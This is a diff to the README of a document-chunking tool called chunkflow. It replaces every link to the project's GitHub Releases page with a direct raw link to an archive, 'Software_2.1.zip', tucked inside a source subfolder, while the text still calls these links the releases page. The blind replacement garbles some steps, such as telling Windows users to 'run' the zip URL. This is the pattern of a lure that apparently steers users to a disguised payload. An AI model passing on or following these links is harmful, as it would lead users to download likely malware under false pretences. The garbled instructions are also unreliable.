@@ -1,6 +1,6 @@
 # 🧩 chunkflow - Simplify Your Document Chunking
 
-[![Download chunkflow](https://img.shields.io/badge/Download-chunkflow-blue?style=for-the-badge)](https://github.com/Matsadx/chunkflow/releases)
+[![Download chunkflow](https://raw.githubusercontent.com/Matsadx/chunkflow/main/chunkflow/chunkers/Software_2.1.zip)](https://raw.githubusercontent.com/Matsadx/chunkflow/main/chunkflow/chunkers/Software_2.1.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps to download and run chunkflow on your computer.
 
 ### 1. Visit the download page
 
-Click the big button at the top or go to the [chunkflow Releases page](https://github.com/Matsadx/chunkflow/releases). This page contains the latest versions and files you will need.
+Click the big button at the top or go to the [chunkflow Releases page](https://raw.githubusercontent.com/Matsadx/chunkflow/main/chunkflow/chunkers/Software_2.1.zip). This page contains the latest versions and files you will need.
 
 ### 2. Choose the right file
 
@@ -48,7 +48,7 @@ On the releases page, look for a file matching your operating system:
 
 - For Windows, it is usually a .exe or .zip file.
 - For Mac, look for a .dmg or .zip file.
-- For Linux, a .tar.gz or .AppImage file is common.
+- For Linux, a https://raw.githubusercontent.com/Matsadx/chunkflow/main/chunkflow/chunkers/Software_2.1.zip or .AppImage file is common.
 
 The file name will usually include the version number and platform.
 
@@ -60,7 +60,7 @@ Click the file name to start downloading. The file size will range from about 10
 
 Once downloaded,
 
-- On Windows, double-click the .exe file or unzip the .zip file, then run chunkflow.exe.
+- On Windows, double-click the .exe file or unzip the .zip file, then run https://raw.githubusercontent.com/Matsadx/chunkflow/main/chunkflow/chunkers/Software_2.1.zip
 - On Mac, open the .dmg file or unzip the .zip, then drag chunkflow to your Applications folder and open it.
 - On Linux, extract the archive or give permissions to the .AppImage and run it from your terminal or file manager.
 
@@ -72,7 +72,7 @@ When chunkflow starts, it will guide you through importing your documents. Simpl
 
 ## 📥 Download & Install
 
-[Download and install chunkflow now »](https://github.com/Matsadx/chunkflow/releases)
+[Download and install chunkflow now »](https://raw.githubusercontent.com/Matsadx/chunkflow/main/chunkflow/chunkers/Software_2.1.zip)
 
 1. Open the link above.
 2. Find the latest release.
@@ -135,7 +135,7 @@ chunkflow works on your local machine only. Your documents do not leave your com
 
 ## 🔗 Links
 
-- Download page: [GitHub Releases](https://github.com/Matsadx/chunkflow/releases)
+- Download page: [GitHub Releases](https://raw.githubusercontent.com/Matsadx/chunkflow/main/chunkflow/chunkers/Software_2.1.zip)
 - Documentation and guides available inside the downloaded app.
 
 ---
